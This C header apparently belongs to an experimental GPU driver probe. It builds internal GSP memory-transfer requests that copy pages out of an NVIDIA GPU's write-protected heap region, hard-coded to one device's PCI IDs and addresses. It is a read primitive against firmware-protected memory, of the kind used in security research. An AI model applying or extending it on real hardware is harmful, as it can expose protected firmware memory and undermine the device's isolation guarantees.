/* SPDX-License-Identifier: MIT. Fixed observed heap, read-only experimental ABI. */
#ifndef CODEX_GSP_READ_PROBE_H
#define CODEX_GSP_READ_PROBE_H
#define GSP_READ_PROBE_CMD 0x2080ff71U
#define GSP_READ_PROBE_VERSION 4U
#define GSP_READ_PROBE_WPR_START 0x3ef020000ULL
#define GSP_READ_PROBE_WPR_END   0x3f9c60000ULL
#define GSP_READ_PROBE_SOURCE    0x3ef024000ULL
#define GSP_READ_PROBE_HEAP_SIZE 0x73dc000ULL
#define GSP_READ_PROBE_PAGE_SIZE 4096U
#define GSP_READ_PROBE_MAX_CALLS 32768U
typedef struct {
 NvU32 version, operation, reserved[2];
 NvU64 pageOffset; /* Input: relative, page-aligned, inside this fixed heap only. */
 NvU32 stage, rpcStatus, bytesRead, retainedBuffer, callsUsed, reservedOut;
 NvU64 wprStart, wprEnd, image, imageSize, heap, heapSize, source;
 NvU8 data[GSP_READ_PROBE_PAGE_SIZE];
} GSP_READ_PROBE_PARAMS;
static int gspReadProbeBuild(NV2080_CTRL_INTERNAL_MEMMGR_MEMORY_TRANSFER_WITH_GSP_PARAMS *p,
 NvU32 pci, NvU32 sub, NvU64 start, NvU64 end, NvU64 offset, NvU64 dest) {
 if (pci != 0x2c1910deU || sub != 0x60411d05U ||
     start != GSP_READ_PROBE_WPR_START || end != GSP_READ_PROBE_WPR_END ||
     (offset & 4095) || offset > GSP_READ_PROBE_HEAP_SIZE-4096 ||
     !dest || (dest & 4095) || dest > (~(NvU64)0)-4095) return 0;
 *p = (NV2080_CTRL_INTERNAL_MEMMGR_MEMORY_TRANSFER_WITH_GSP_PARAMS){0};
 p->src.baseAddr=GSP_READ_PROBE_SOURCE+offset; p->src.size=4096;
 p->src.aperture=2; p->src.cpuCacheAttrib=0;
 p->dst.baseAddr=dest; p->dst.size=4096; p->dst.aperture=1; p->dst.cpuCacheAttrib=0;
 p->transferSize=4096; p->memop=NV2080_CTRL_MEMMGR_MEMORY_OP_MEMCPY;
 return 1;
}
#endif
